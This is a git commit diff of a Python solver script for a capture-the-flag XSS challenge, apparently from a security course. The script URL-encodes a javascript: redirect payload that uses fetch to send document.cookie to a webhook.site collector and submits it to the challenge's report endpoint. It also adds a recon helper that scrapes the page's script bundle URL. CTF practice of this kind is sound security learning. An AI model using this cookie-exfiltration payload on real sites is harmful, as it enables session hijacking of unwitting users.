205d924e5da090759b4768b2b874af9df356406a
SAW <99191294+nicsaw@users.noreply.github.com>
2025-04-11 17:48:08 +1000

    XSS Playground 4 - Recon

--- ctf/4-XSS/xss_playground_4.py
+++ ctf/4-XSS/xss_playground_4.py
@@ -5,19 +5,28 @@ from utils import get_session, WebhookSite
 
 import urllib.parse
 
+BASE_URL = "https://xss-playground-4.quoccacorp.com"
+
 class Solver:
     def __init__(self):
         self.session = get_session()
         self.webhooksite = WebhookSite()
 
-    def main(self):
-        BASE_URL = "https://xss-playground-4.quoccacorp.com"
+    def get_js_bundle_url(self) -> str:
+        from bs4 import BeautifulSoup
+        response = self.session.get(BASE_URL, allow_redirects=False)
+        soup = BeautifulSoup(response.text, "html.parser")
+        script_src = soup.find("script", src=True)["src"]
+        source_code_url = f"{BASE_URL}{script_src}"
+        return source_code_url
 
+    def main(self):
         PAYLOAD = f"javascript:fetch(`{self.webhooksite.url}?q=${{document.cookie}}`)"
         encoded_payload = urllib.parse.quote(PAYLOAD)
 
         report_url = f"{BASE_URL}/find-logged-in-page?redirectAfterLogin={encoded_payload}"
         self.session.post(f"{BASE_URL}/report", data={"url": report_url})
+
         self.webhooksite.find_flags()
 
 if __name__ == "__main__":
